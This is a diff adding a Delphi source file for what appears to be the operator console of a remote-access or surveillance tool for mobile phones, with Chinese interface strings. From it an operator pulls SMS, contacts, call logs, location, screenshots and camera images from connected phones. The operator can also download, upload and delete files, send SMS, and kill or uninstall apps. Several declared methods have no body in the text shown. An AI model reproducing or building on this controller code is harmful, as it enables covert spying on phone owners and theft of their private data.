@@ -1,0 +1,1100 @@
+unit uMain;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, Vcl.ComCtrls, Vcl.OleCtrls,
+  SHDocVw, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.Buttons,Jpeg,strutils,MSHTML, ScktComp,ShellApi,
+  uDM,uOrder,untQQWry,uLog,uRecvDataControl,uRecvData,uSocket,uCameraCap,uSetphone,ansiStrings;
+
+type
+ TfMain = class(TForm)
+    Panel1: TPanel;
+    btnClose: TSpeedButton;
+    btnCameraCap: TSpeedButton;
+    Bar1: TStatusBar;
+    treePhone: TTreeView;
+    Page1: TPageControl;
+    tbPhoneInfo: TTabSheet;
+    memoPhoneInf: TMemo;
+    tbScreen: TTabSheet;
+    ScrollBox1: TScrollBox;
+    imgScreen: TImage;
+    tbSmallScreen: TTabSheet;
+    imgScreen2: TImage;
+    tbsControlSet: TTabSheet;
+    Splitter5: TSplitter;
+    memoOut: TMemo;
+    btnLocation: TSpeedButton;
+    tbSMS: TTabSheet;
+    memoSms: TMemo;
+    tbLocation: TTabSheet;
+    WebBrowser1: TWebBrowser;
+    btnShotSeriesScreen: TButton;
+    tbFiles: TTabSheet;
+    ListFiles: TListView;
+    Splitter2: TSplitter;
+    TreeDir: TTreeView;
+    PopDir: TPopupMenu;
+    PopCrtDir: TMenuItem;
+    PopDelDir: TMenuItem;
+    PopUpLoadDir: TMenuItem;
+    PopDownDir: TMenuItem;
+    PopSearchFile: TMenuItem;
+    PopFile: TPopupMenu;
+    popUpFile: TMenuItem;
+    PopDownFile: TMenuItem;
+    PopDelFile: TMenuItem;
+    popInsertImg: TMenuItem;
+    Open1: TOpenDialog;
+    Save1: TSaveDialog;
+    Find1: TFindDialog;
+    Panel2: TPanel;
+    btnSendSms: TSpeedButton;
+    btnSendSmss: TSpeedButton;
+    btnSMS: TSpeedButton;
+    btnCaLL: TSpeedButton;
+    btnContact: TSpeedButton;
+    Label5: TLabel;
+    edtTargetPhone: TEdit;
+    tbProcess: TTabSheet;
+    GroupBox2: TGroupBox;
+    listThirdApp: TListView;
+    GroupBox1: TGroupBox;
+    listSysApp: TListView;
+    Panel5: TPanel;
+    btnGetAppInfo: TButton;
+    popApp: TPopupMenu;
+    popRunApp: TMenuItem;
+    popKillProcess: TMenuItem;
+    popUnInstallApp: TMenuItem;
+    btnConnect: TSpeedButton;
+    btnSetPhone: TSpeedButton;
+    procedure FormCreate(Sender: TObject);
+    procedure FormShow(Sender: TObject);
+    procedure btnCloseClick(Sender: TObject);
+    procedure treePhoneClick(Sender: TObject);
+    procedure FormClose(Sender: TObject; var Action: TCloseAction);
+    procedure btnShotSeriesScreenClick(Sender: TObject);
+    procedure btnConnectClick(Sender: TObject);
+    procedure FormDestroy(Sender: TObject);
+    procedure btnCameraCapClick(Sender: TObject);
+    procedure PopDelDirClick(Sender: TObject);
+    procedure PopDownDirClick(Sender: TObject);
+    procedure popUpFileClick(Sender: TObject);
+    procedure PopDownFileClick(Sender: TObject);
+    procedure PopDelFileClick(Sender: TObject);
+    procedure popInsertImgClick(Sender: TObject);
+    procedure btnGetAppInfoClick(Sender: TObject);
+    procedure btnSMSClick(Sender: TObject);
+    procedure btnCaLLClick(Sender: TObject);
+    procedure btnContactClick(Sender: TObject);
+    procedure btnSendSmsClick(Sender: TObject);
+    procedure btnSendSmssClick(Sender: TObject);
+    procedure btnLocationClick(Sender: TObject);
+    procedure btnSetPhoneClick(Sender: TObject);
+    procedure TreeDirChange(Sender: TObject; Node: TTreeNode);
+  private
+    { Private declarations }
+    QQWry: TQQWry;
+    stream:tMemoryStream;
+    jpg: TJPEGImage; // 要use Jpeg单元
+    procedure TryExcepts(Sender: TObject; E: Exception);
+    procedure DataMsg(var msg:TMessage);message wm_Data;
+    procedure ListPhone(oh:stOrderHeader);
+
+    function AddPhoneToTree(ip,phoneId:string):integer;
+    procedure DelPhoneFromTree(phoneId:DWORD);
+    procedure ShowIPAddr(IP:string);
+
+    procedure updateImage(pData:pointer;len:integer);
+
+    //procedure RecvDataMsg(var aMessage:Tmessage);message wm_TransData;
+    //procedure TransOrderMsg(var aMessage:Tmessage);message wm_TransOrder;
+    procedure TreansFileMsg(var aMessage:Tmessage);message wm_TransFile;
+     procedure RecvDataMsg(var aMessage:Tmessage);message wm_TransData;
+    function GetTreeDir(node:ttreenode;var phoneDir:TPhoneDir):ansistring;
+    function getRootDir(rootDir:string):DWORD;
+    function getListFile(node:ttreenode;item:tlistItem):TPhoneFileName;
+    procedure ProcessGetFileInfos(FileInfos:pointer;size:integer);
+    function GetFileIconIndex(FileName: string; Large: Boolean): Integer;
+    function getAppInfo(var ss:String):boolean;
+    procedure processGetAppInfos(pData:pointer;size:integer);
+    function SetLocation(data:pointer;len:integer):boolean;
+    procedure ShowSocketErr(ErrorEvent: TErrorEvent);
+  public
+    { Public declarations }
+    function selectPhone():DWORD;//返回手机id
+    procedure AddPhone(oh:stOrderHeader);
+    procedure LogMain(const txt:string);
+  end;
+
+var
+  fMain: TfMain;
+  function ExecuteJavaScript(WebBrowser:TWebBrowser; Code: string):Variant;
+implementation
+
+{$R *.dfm}
+uses
+  uAuth,uFuncs,uConfig,uScreen,uSmallScreen;
+
+
+procedure TfMain.popUpFileClick(Sender: TObject);
+var
+  LocalName,remoteName,LocalDir:utf8String;
+  fi:stTransFilesInfo;
+  phoneDir:tPhoneDir;
+  node: TTreeNode ;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+  Node:=treedir.Selected;
+  if(Node=nil)then exit;
+  GetTreeDir(Node,phoneDir);
+  remoteName:=phoneDir.subDir;
+  if open1.Execute then
+  begin
+    LocalName:=open1.FileName;
+    LocalDir:=extractfiledir(LocalName);
+    open1.InitialDir:=LocalDir;
+
+    if(remoteName='')then
+       remoteName:=ExtractFileName(LocalName)
+    else
+       remoteName:=remoteName+'/'+ExtractFileName(LocalName);
+    zeromemory(@fi,sizeof(fi));
+    ansiStrings.strcopy(fi.clientFile,pansichar(remoteName));
+    ansiStrings.strcopy(fi.serverFile,pansichar(LocalName));
+    fi.iRootDir:=phoneDir.iRootDir;
+    fi.bUpLoad:=false;
+    fi.bFolder:=false;
+    fi.bCompleteDel:=false;
+    //if(dm.StartRecvDataThread(CMD_FILE_TRANS)=false)then exit;
+    //dm.SendOrderToClient(socket,CMD_FILE_TRANS,integer(pClient^.Socket),@fi,sizeof(fi));
+    dm.SendOrder(CMD_FILE_TRANS,phoneId,sizeof(fi),@fi);
+    if(uRecvDataControl.StartRecvDataThread(CMD_FILE_TRANS)=false)then exit;
+  end;
+
+end;
+
+procedure TfMain.processGetAppInfos(pData:pointer;size:integer);
+var
+  ss:string;
+begin
+  ss:=pansiChar(pdata);
+  listSysApp.Clear;
+  listThirdApp.Clear;
+  while(getAppInfo(ss))do
+  begin
+  end;
+end;
+procedure TfMain.btnCaLLClick(Sender: TObject);
+var
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+  //if(dm.StartRecvDataThread(CMD_CALL)=false)then exit;
+  //dm.SendOrderToClient(socket,CMD_CALL,integer(pClient^.Socket));
+  dm.SendOrder(CMD_CALL,phoneId);
+  if(uRecvDataControl.StartRecvDataThread(CMD_CALL)=false)then exit;
+end;
+
+procedure TfMain.btnContactClick(Sender: TObject);
+var
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+  //if(dm.StartRecvDataThread(CMD_CONTACT_CONTENT)=false)then exit;
+  //dm.SendOrderToClient(socket,CMD_CONTACT_CONTENT,integer(pClient^.Socket));
+  dm.SendOrder(CMD_CONTACT_CONTENT,phoneId);
+  if(uRecvDataControl.StartRecvDataThread(CMD_CONTACT_CONTENT)=false)then exit;
+end;
+
+procedure TfMain.btnGetAppInfoClick(Sender: TObject);
+var
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+
+  //if(dm.StartRecvDataThread(CMD_GET_INSTALL_APP_INFO)=false)then exit;
+  //dm.SendOrderToClient(socket,CMD_GET_INSTALL_APP_INFO,integer(pClient^.Socket));
+  dm.SendOrder(CMD_GET_INSTALL_APP_INFO,phoneId);
+  if(uRecvDataControl.StartRecvDataThread(CMD_GET_INSTALL_APP_INFO)=false)then exit;
+end;
+
+procedure TfMain.btnLocationClick(Sender: TObject);
+var
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+
+  //if(dm.StartRecvDataThread(CMD_LOCATION_SINGLE)=false)then exit;
+  //dm.SendOrderToClient(socket,CMD_LOCATION_SINGLE,integer(pClient^.Socket));
+  dm.SendOrder(CMD_LOCATION_SINGLE,phoneId);
+  if(uRecvDataControl.StartRecvDataThread(CMD_LOCATION_SINGLE)=false)then exit;
+end;
+
+procedure TfMain.btnSendSmsClick(Sender: TObject);
+var
+  phoneNode: TTreeNode ;
+  s:string;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+  if(edtTargetPhone.Text='')then
+  begin
+    showmessage('请输入手机号！');
+    exit;
+  end;
+    if(memoSms.Text='')then
+  begin
+    showmessage('请输入短信内容！');
+    exit;
+  end;
+  s:=edtTargetPhone.Text+';'+memoSms.Text;
+  //dm.SendOrderToClient(socket,CMD_SMS_SEND,integer(pClient^.Socket),s);
+  dm.SendOrder(CMD_SMS_SEND,phoneId,s);
+end;
+
+procedure TfMain.btnSendSmssClick(Sender: TObject);
+var
+  s:string;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+
+  if(memoSms.Text='')then
+  begin
+    showmessage('请输入短信内容！');
+    exit;
+  end;
+  s:=memoSms.Text;
+  //dm.SendOrderToClient(socket,CMD_SMS_SENDS,integer(pClient^.Socket),s);
+  dm.SendOrder(CMD_SMS_SEND,phoneId,s);
+end;
+
+procedure TfMain.btnSetPhoneClick(Sender: TObject);
+begin
+  fSetPhone.mUserId:=dm.mUserId;
+  fSetPhone.show;
+end;
+
+procedure TfMain.btnSMSClick(Sender: TObject);
+var
+  s:string;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+  //if(dm.StartRecvDataThread(CMD_SMS_CONTENT)=false)then exit;
+  //dm.SendOrderToClient(socket,CMD_SMS_CONTENT,integer(pClient^.Socket));
+  dm.SendOrder(CMD_SMS_CONTENT,phoneId);
+  if(uRecvDataControl.StartRecvDataThread(CMD_SMS_CONTENT)=false)then exit;
+end;
+
+function TfMain.getAppInfo(var ss:String):boolean;
+var
+  app,pkg,flag:string;
+  i:integer;
+  appItem:tListItem;
+begin
+  i:=pos(';',ss);
+  if(i<=0)then begin result:=false;exit;end;
+  app:=copy(ss,1,i-1);
+  delete(ss,1,i);
+
+  i:=pos(';',ss);
+  if(i<=0)then begin result:=false;exit;end;
+  pkg:=copy(ss,1,i-1);
+  delete(ss,1,i);
+
+  i:=pos(';',ss);
+  if(i<=0)then begin result:=false;exit;end;
+  flag:=copy(ss,1,i-1);
+  delete(ss,1,i);
+
+  if(flag='SYSTEM')then
+  begin
+    appItem:=listSysApp.Items.Add;
+  end else begin
+    appItem:=listThirdApp.Items.Add;
+  end;
+  appItem.Caption:=app;
+  //item.ImageIndex:=getFileiconIndex(fileName,false);
+  appItem.SubItems.Add(pkg);
+  appItem.SubItems.Add(flag);
+  result:=true;
+end;
+
+procedure tFMain.TreansFileMsg(var aMessage:Tmessage);
+var
+  p:pointer;
+  pData:pTransFilesCS;
+  pRun:pRunAPIInfo;
+  pClient:pClientInfo;
+begin
+  p:=pointer(aMessage.LParam);
+  pData:=p;
+  pRun:=pRunAPIInfo(pansiChar(pData)+sizeof(stThreadInfo));
+  bar1.panels[0].Text:=pRun^.Info;
+  memoout.Lines.Add(pRun^.Info);
+end;
+procedure TfMain.TreeDirChange(Sender: TObject; Node: TTreeNode);
+var
+  phoneDir:TPhoneDir;
+  phoneId:DWORD;
+  //Node: TTreeNode;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+  //node:=treedir.Selected;
+  GetTreeDir(Node,phoneDir);
+
+  dm.SendOrder(CMD_FILE_LIST,phoneId,phoneDir.iRootDir,ansiString(phoneDir.subDir));
+  if(uRecvDataControl.StartRecvDataThread(CMD_FILE_LIST)=false)then exit;
+
+end;
+
+procedure tFMain.RecvDataMsg(var aMessage:Tmessage);
+var
+  p:pointer;
+  pData:pRecvDataCS;
+  pRun:pRunInfo;
+  pClient:pClientInfo;
+begin
+  p:=pointer(aMessage.LParam);
+  pData:=p;
+  pRun:=pRunInfo(pansiChar(p)+sizeof(stSvrAddr)+sizeof(stSendMsgTo));
+  bar1.panels[0].Text:=pData^.runInf.Inf;
+  memoout.Lines.Add(pData^.runInf.Inf);
+  if(pData^.runInf.FInf<>FrecvData) then exit;
+  if(pData^.runInf.bResult=false) then exit;
+  case pData^.oh.cmd of
+    CMD_INFO:
+    begin
+      memoPhoneInf.Clear;
+      memoPhoneInf.lines.add(uFuncs.VerifyStr(pData^.oh.dat,pData^.oh.len));
+      if(treePhone.Selected<>nil)then
+      ShowIPAddr(treePhone.Selected.Text);
+    end;//o_PCInfo
+    CMD_SHOT:
+    begin
+      if(pData^.oh.dat=nil)then exit;
+      if(pData^.oh.len<=0)then exit;
+      updateImage(pData^.oh.Dat,pData^.oh.len);
+    end;//o_PCInfo
+    CMD_CAMERA_CAP_START:
+    begin
+      if(pData^.oh.dat=nil)then exit;
+      if(pData^.oh.len<=0)then exit;
+      fCameraCap.updateImage(pData^.oh.Dat,pData^.oh.len);
+    end;//o_PCInfo
+    CMD_SMS_CONTENT:
+    begin
+      memoSMS.Clear;
+      memoSMS.lines.Add(uFuncs.VerifyStr(pData^.oh.dat,pData^.oh.len));
+    end;
+    CMD_CONTACT_CONTENT:
+    begin
+      memoSMS.Clear;
+      memoSMS.lines.Add(uFuncs.VerifyStr(pData^.oh.dat,pData^.oh.len));
+    end;
+    CMD_CALL:
+    begin
+      memoSMS.Clear;
+      memoSMS.lines.Add(uFuncs.VerifyStr(pData^.oh.dat,pData^.oh.len));
+    end;
+    CMD_LOCATION_SINGLE:
+    begin
+      SetLocation(pData^.oh.dat,pData^.oh.len);
+      tbLocation.Show;
+    end;
+    CMD_FILE_LIST:
+    begin
+      ProcessGetFileInfos(pData^.oh.dat,pData^.oh.len);
+    end;//o_PCInfo
+    CMD_GET_INSTALL_APP_INFO:
+    begin
+      processGetAppInfos(pData^.oh.dat,pData^.oh.len);
+      memoOut.lines.Add(uFuncs.VerifyStr(pData^.oh.dat,pData^.oh.len));
+    end;//o_PCInfo
+  end;
+end;
+
+function tFMain.SetLocation(data:pointer;len:integer):boolean;
+var
+  func,s,provider:string;
+  i,j:integer;
+begin
+  s:=pansiChar(data);
+  i:=pos('(',s);
+  j:=pos(')',s);
+  provider:=LeftStr(s,i-1);
+  func:='locate'+MidStr(s,i,j-i+1);
+  memoout.Lines.Add(func)  ;
+  ExecuteJavaScript(WebBrowser1,func);
+  memoout.Lines.Add(provider)  ;
+  result:=true;
+end;
+
+function ExecuteJavaScript(WebBrowser:TWebBrowser; Code: string):Variant; //获取js函数
+var
+Document:IHTMLDocument2;
+Window:IHTMLWindow2;
+begin
+// execute javascript in webbrowser
+Document:=WebBrowser.Document as IHTMLDocument2;
+if not Assigned(Document) then Exit;
+Window:=Document.parentWindow;
+if not Assigned(Window) then Exit;
+try
+Result:=Window.execScript(Code,'JavaScript');
+except
+on E:Exception do raise Exception.Create('Javascript error '+E.Message+' in: '#13#10+Code);
+end;
+end;
+procedure TfMain.PopDownFileClick(Sender: TObject);
+var
+  socket:TCustomWinSocket;
+  pClient:pClientInfo;
+  LocalName,remoteName,LocalDir:utf8String;
+  fi:stTransFilesInfo;
+   phoneNode: TTreeNode ;
+   phoneFileName:TPhoneFileName;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+  if(treeDir.Selected=nil) or (ListFiles.Selected=nil)then exit;
+
+  phoneFileName:=getListFile(treeDir.Selected,ListFiles.Selected);
+  save1.FileName:=uFuncs.ExtractPhoneFilename(phoneFileName.fileName);
+  if save1.Execute then
+  begin
+    LocalName:=save1.FileName;
+    LocalDir:=extractfiledir(LocalName);
+    save1.InitialDir:=LocalDir;
+
+    zeromemory(@fi,sizeof(fi));
+    fi.iRootDir:=phoneFileName.iRootDir;
+    //ansiStrings.
+    ansiStrings.strcopy(fi.clientFile,pansiChar(phoneFileName.filename));
+    ansiStrings.strcopy(fi.serverFile,pansiChar(LocalName));
+    fi.bUpLoad:=true;
+    fi.bFolder:=false;
+    fi.bCompleteDel:=false;
+
+    //if(dm.StartRecvDataThread(CMD_FILE_TRANS)=false)then exit;
+    //dm.SendOrderToClient(socket,CMD_FILE_TRANS,integer(pClient^.Socket),@fi,sizeof(fi));
+    dm.SendOrder(CMD_FILE_TRANS,phoneId,sizeof(fi),@fi);
+    if(uRecvDataControl.StartRecvDataThread(CMD_FILE_TRANS)=false)then exit;
+  end;
+
+end;
+
+procedure TfMain.popInsertImgClick(Sender: TObject);
+var
+  socket:TCustomWinSocket;
+  pClient:pClientInfo;
+  LocalName,remoteName,LocalDir:utf8String;
+  fi:stTransFilesInfo;
+   phoneNode: TTreeNode ;
+   phoneFileName:TPhoneFileName;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+
+ if(treeDir.Selected=nil) or (ListFiles.Selected=nil)then exit;
+  phoneFileName:=getListFile(treeDir.Selected,ListFiles.Selected);
+ //dm.SendOrderToClient(socket,CMD_INSERT_IMG_TO_GALLERY,integer(pClient^.Socket),phoneFileName.iRootDir,pansiChar(phoneFileName.filename));
+ dm.SendOrder(CMD_INSERT_IMG_TO_GALLERY,phoneId,phoneFileName.iRootDir,ansiString(phoneFileName.filename));
+
+end;
+
+procedure tfmain.ShowSocketErr(ErrorEvent: TErrorEvent);
+begin
+if ErrorEvent=eeConnect then
+  begin
+    fmain.bar1.Panels[0].Text:='连接失败！';
+  end;
+  if ErrorEvent=eeGeneral then
+  begin
+    fmain.bar1.Panels[0].Text:='无法识别的错误！';
+  end;
+  if ErrorEvent=eeSend then
+  begin
+    fmain.bar1.Panels[0].Text:='发送数据失败！';
+  end;
+    if ErrorEvent=eeReceive then
+  begin
+    fmain.bar1.Panels[0].Text:='接受数据失败！';
+  end;
+    if ErrorEvent=eeDisconnect then
+  begin
+    //DisCon(socket);
+
+    fmain.bar1.Panels[0].Text:='关闭连接失败！';
+  end;
+    if ErrorEvent=eeAccept then
+  begin
+    fmain.bar1.Panels[0].Text:='接受连接失败！';
+  end;
+end;
+
+procedure TfMain.updateImage(pData:pointer;len:integer);
+begin
+  if(pData=nil)then exit;
+  if(len<=0)then exit;
+try
+  stream.Clear;
+  stream.Write(pData^,len);
+  stream.Position:=0;
+  jpg.LoadFromStream(stream);
+  fScreen.imgScreen.Picture.Graphic:=jpg;
+  fSmallScreen.imgScreen2.Picture.Graphic:=jpg;
+  fScreen.imgScreen.Update;
+  fSmallScreen.imgScreen2.Update;
+finally
+  stream.Clear;
+end;
+end;
+
+procedure tFMain.LogMain(const txt:string);
+begin
+  memoout.Lines.Add(uLog.Log(txt));
+end;
+procedure TfMain.PopDelDirClick(Sender: TObject);
+var
+  socket:TCustomWinSocket;
+  pClient:pClientInfo;
+  pos:tPosition;
+   phoneNode: TTreeNode ;
+   phoneDir:tphoneDir;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+ if(treeDir.Selected=nil)then exit;
+
+  getTreeDir(treeDir.Selected,phoneDir);
+
+  //dm.SendOrderToClient(socket,CMD_FILE_DEL,integer(pClient^.Socket),phoneDir.iRootDir,phoneDir.subDir);
+  dm.SendOrder(CMD_FILE_DEL,phoneId,phoneDir.iRootDir,ansiString(phoneDir.subDir));
+end;
+
+procedure TfMain.PopDelFileClick(Sender: TObject);
+var
+  socket:TCustomWinSocket;
+  pClient:pClientInfo;
+  LocalName,remoteName,LocalDir:utf8String;
+  fi:stTransFilesInfo;
+   phoneNode: TTreeNode ;
+   phoneFileName:TPhoneFileName;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+ if(treeDir.Selected=nil) or (ListFiles.Selected=nil)then exit;
+  phoneFileName:=getListFile(treeDir.Selected,ListFiles.Selected);
+ //dm.SendOrderToClient(socket,CMD_FILE_DEL,integer(pClient^.Socket),phoneFileName.iRootDir,pansiChar(phoneFileName.filename));
+ dm.SendOrder(CMD_FILE_DEL,phoneId,phoneFileName.iRootDir,ansiString(phoneFileName.filename));
+end;
+
+procedure TfMain.PopDownDirClick(Sender: TObject);
+var
+  socket:TCustomWinSocket;
+  pClient:pClientInfo;
+  pos:tPosition;
+   phoneNode: TTreeNode ;
+   phoneDir:tphoneDir;
+   LocalName,remoteName,LocalDir:string;
+   fi:stTransFilesInfo;
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+
+  if(treeDir.Selected=nil)then exit;
+  getTreeDir(treeDir.Selected,phoneDir);
+  save1.FileName:=uFuncs.ExtractPhoneFilename(phoneDir.subDir)+'.zip';
+ if save1.Execute then
+  begin
+    LocalName:=save1.FileName;
+    LocalDir:=extractfiledir(LocalName);
+    save1.InitialDir:=LocalDir;
+
+    zeromemory(@fi,sizeof(fi));
+    fi.iRootDir:=phoneDir.iRootDir;
+    ansiStrings.strcopy(fi.clientFile,pansiChar(phoneDir.subDir));
+    ansiStrings.strcopy(fi.serverFile,pansiChar(LocalName));
+    fi.bUpLoad:=true;
+    fi.bFolder:=true;
+    fi.bCompleteDel:=true;
+
+    //if(dm.StartRecvDataThread(CMD_FILE_TRANS)=false)then exit;
+    //dm.SendOrderToClient(socket,CMD_FILE_TRANS,integer(pClient^.Socket),@fi,sizeof(fi));
+    dm.SendOrder(CMD_FILE_TRANS,phoneId,sizeof(fi),@fi);
+  if(uRecvDataControl.StartRecvDataThread(CMD_FILE_TRANS)=false)then exit;
+  end;
+end;
+
+function tFMain.selectPhone():DWORD;
+var
+   phoneNode: TTreeNode ;
+begin
+  result:=0;
+  phoneNode:=treePhone.Selected;
+  if(phoneNode=nil)then
+  begin
+    showmessage('请先选择手机！');
+    exit;
+  end;
+  if(dm.csOrder.Active=false)then
+  begin
+    showmessage('请先连接服务器！');
+    if(dm.csOrder.Active=false)then fmain.btnConnect.Enabled:=true else fmain.btnConnect.Enabled:=false;
+    exit;
+  end;
+  result:=DWORD(phoneNode.Data);
+end;
+
+procedure TfMain.DataMsg(var msg:TMessage);
+var
+  flg:TFdataMsgFlag;
+  poh:POrderHeader;
+begin
+  flg:=TFdataMsgFlag(msg.WParam);
+  case flg of
+    Forderconnect:fMain.bar1.Panels[0].Text:='已连接服务器.';
+    FgetUserId:
+    begin
+      fMain.Page1.Enabled:=true;
+      //fMain.panel1.Enabled:=false;
+      btnConnect.Enabled:=false;
+      btnShotSeriesScreen.Enabled:=true;
+      btnCameraCap.Enabled:=true;
+      btnLocation.Enabled:=true;
+      btnClose.Enabled:=true;
+      fmain.Caption:=fmain.Caption+'(用户编号：'+inttostr(msg.LParam)+')';
+      dm.SendOrder(CMD_LIST_CLIENT,0);
+    end;
+    FListPhone:
+    begin
+      poh:=POrderHeader(msg.LParam);
+      ListPhone(poh^);
+    end;
+    FDelPhone:
+    begin
+      poh:=POrderHeader(msg.LParam);
+      DelPhoneFromTree(poh^.pid);
+    end;
+    FAddPhone:
+    begin
+      poh:=POrderHeader(msg.LParam);
+      AddPhone(poh^);
+    end;
+    {
+    FRecvData:
+    begin
+      poh:=POrderHeader(msg.LParam);
+      case poh^.cmd of
+      CMD_INFO:
+        begin
+          memoPhoneInf.Clear;
+          memoPhoneInf.lines.add(uFuncs.VerifyStr(poh^.dat,poh^.len));
+        end;
+      CMD_SHOT:
+        begin
+          if(poh^.dat=nil)then exit;
+          if(poh^.len<=0)then exit;
+          updateImage(poh^.dat,poh^.len);
+        end;//o_PCInfo
+      end;
+
+    end;
+    }
+  end;
+end;
+ {
+function tfMain.DelPhoneFromTree(phoneId:string):integer;
+var
+  node:ttreenode;
+  i:integer;
+  nodeClient:pClientInfo;
+begin
+  for i:=0 to fmain.treeClient.Items.Count-1 do
+  begin
+    node:=fmain.treeClient.Items[i];
+    nodeClient:=node.Data;
+    if(nodeClient=nil)then continue;
+    if(nodeClient^.Socket=pClient^.socket)then
+    begin
+      dispose(nodeClient);
+      treeClient.Items.Delete(node);
+      memoout.Lines.Add('断开连接：'+pClient^.IP);
+    end;
+  end;
+  result:=fmain.treeClient.Items.Count;
+end;
+}
+function tfMain.AddPhoneToTree(ip,phoneId:string):integer;
+var
+  node:ttreenode;
+begin
+  node:=nil;
+  node:=fmain.treePhone.Items.add(node,ip);
+  node.ImageIndex:=8;
+  node.SelectedIndex:=8;
+  node.StateIndex:=8;
+  node.Data:=pointer(strtoint(phoneId));
+  result:=node.AbsoluteIndex;
+  memoout.Lines.Add('新增连接：'+ip);
+  ShowIPAddr(ip);
+end;
+
+procedure tfMain.DelPhoneFromTree(phoneId:DWORD);
+var
+  node:ttreenode;
+  i:integer;
+begin
+
+  //ShowIPAddr(ip);
+  for i:=0 to fmain.treePhone.Items.Count-1 do
+  begin
+    node:=fmain.treePhone.Items[i];
+    if(DWORD(node.Data)=phoneId)then
+    begin
+      treePhone.Items.Delete(node);
+      memoout.Lines.Add('断开连接.');
+      exit;
+    end;
+  end;
+
+end;
+
+procedure TfMain.AddPhone(oh:stOrderHeader);
+var
+  txt,ip,phoneId:ansiString;
+  i:integer;
+  node:ttreenode;
+begin
+try
+  setLength(txt,oh.len);
+  copymemory(@txt[1],oh.dat,oh.len);
+  i:=pos(',',txt);
+  phoneId:=ansiStrings.leftstr(txt,i-1);
+  ip:=ansiStrings.midstr(txt,i+1,length(txt)-i-2);
+  LogMain(txt);
+  AddPhoneToTree(string(ip),string(phoneId));
+finally
+
+end;
+end;
+
+procedure TfMain.ListPhone(oh:stOrderHeader);
+var
+  txt:ansiString;
+  ss1,ss2:tstrings;
+  i:integer;
+  node:ttreenode;
+begin
+try
+  ss1:=tstringlist.Create;
+  ss2:=tstringlist.Create;
+  setLength(txt,oh.len);
+  copymemory(@txt[1],oh.dat,oh.len);
+  ss1.Text:=txt;
+  if(ss1.Count=0)then exit;
+  LogMain(txt);
+  for i:=0 to fmain.treePhone.Items.Count-1 do
+  begin
+    node:=fmain.treePhone.Items[i];
+      //if(node.Data<>nil)then dispose(node.Data);
+    treePhone.Items.Delete(node);
+  end;
+  for I := 0 to ss1.Count-1 do
+  begin
+    ss2.Delimiter:=',';
+    ss2.DelimitedText:=ss1[i];
+    AddPhoneToTree(ss2[1],ss2[0]);
+
+  end;
+finally
+  ss1.Free;
+  ss2.Free;
+end;
+end;
+procedure TfMain.treePhoneClick(Sender: TObject);
+var
+   phoneId:integer;
+   Node: TTreeNode ;
+begin
+  tbphoneInfo.Show;
+  node:=treePhone.Selected;
+  if(node=nil)then exit;
+  phoneId:=integer(Node.Data);
+  dm.SendOrder(CMD_INFO,phoneId);
+  //dm.csData1.Open;
+  if(StartRecvDataThread(CMD_INFO)=false)then exit;
+end;
+
+procedure TfMain.FormShow(Sender: TObject);
+begin
+  fMain.Page1.Enabled:=false;
+  //fMain.panel1.Enabled:=false;
+  btnConnect.Enabled:=true;
+  btnShotSeriesScreen.Enabled:=false;
+  btnCameraCap.Enabled:=false;
+  btnLocation.Enabled:=false;
+  btnClose.Enabled:=true;
+  DM.ConnectRepeater();
+  ShowIPAddr('');
+  webbrowser1.Navigate(uConfig.mapFile);
+  tbLocation.Show;
+  fmain.Top:=0;
+  fmain.Left:=0;
+  fmain.Width:=1000;
+  stream:=tMemoryStream.Create;
+  jpg := TJPEGImage.Create;
+  initDataServers(uConfig.REPEATER_IP,uConfig.port_data,fMain.Handle);
+end;
+
+procedure TfMain.TryExcepts(Sender: TObject; E: Exception);
+begin
+  memoout.Lines.Add(E.Message);
+end;
+procedure TfMain.btnCameraCapClick(Sender: TObject);
+var
+  phoneId:DWORD;
+begin
+  phoneId:=fmain.selectPhone();
+  if(phoneId=0)then exit;
+fCameraCap.show;
+end;
+
+procedure TfMain.btnCloseClick(Sender: TObject);
+begin
+
+  close();
+end;
+
+procedure TfMain.btnConnectClick(Sender: TObject);
+begin
+  if(dm.csOrder.Active=true)then
+  begin
+    showmessage('已连接服务器！');
+    exit;
+  end else begin
+    dm.csOrder.Active:=true;
+  end;
+end;
+
+procedure TfMain.btnShotSeriesScreenClick(Sender: TObject);
+var
+  phoneNode: TTreeNode ;
+begin
+  phoneNode:=fMain.treePhone.Selected;
+  if(phoneNode=nil)then
+  begin
+    showmessage('请先选择手机！');
+    exit;
+  end;
+fScreen.Show;
+fScreen.top:=0;
+fScreen.left:=100;
+//fScreen.WindowState:=wsMaximized;//窗体最大化
+{
+fSmallScreen.FormStyle:=fsStayOnTop;
+fSmallScreen.show;
+fSmallScreen.WindowState:=wsNormal;//窗体最大化
+fSmallScreen.top:=0;
+fSmallScreen.left:=600;
+     }
+end;
+
+procedure TfMain.FormClose(Sender: TObject; var Action: TCloseAction);
+begin
+  dm.close;
+end;
+
+procedure TfMain.FormCreate(Sender: TObject);
+begin
+  Application.OnException := TryExcepts;
+
+  if not uAuth.authorize then application.Terminate;
+end;
+
